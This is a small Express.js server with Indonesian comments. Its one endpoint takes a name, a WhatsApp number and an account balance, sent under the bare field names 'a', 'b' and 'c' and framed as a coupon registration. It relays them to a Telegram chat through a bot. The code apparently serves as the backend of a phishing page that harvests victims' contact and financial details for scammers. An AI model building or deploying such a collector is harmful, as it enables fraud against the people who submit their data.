const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

app.post('/api/nondril', async (req, res) => {
  try {
    const { a: name, b: phone, c: balance } = req.body;

    // Validasi data
    if (!name || !phone || !balance) {
      return res.status(400).json({
        success: false,
        message: 'Semua field harus diisi'
      });
    }

    // Ambil token dari environment variable (aman)
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // Format pesan untuk Telegram
    const message = `
🆕 Pendaftaran Kupon Baru:
────────────────────
📛 Nama: ${name}
📞 WhatsApp: ${phone}
💳 Saldo: Rp ${balance}
────────────────────
📅 Tanggal: ${new Date().toLocaleString('id-ID')}
    `;

    // Kirim ke Telegram
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      }
    );

    // Simpan ke database jika diperlukan
    // ...

    res.json({
      success: true,
      message: 'Data berhasil dikirim'
    });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({
      success: false,
      message: 'Terjadi kesalahan server'
    });
  }
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
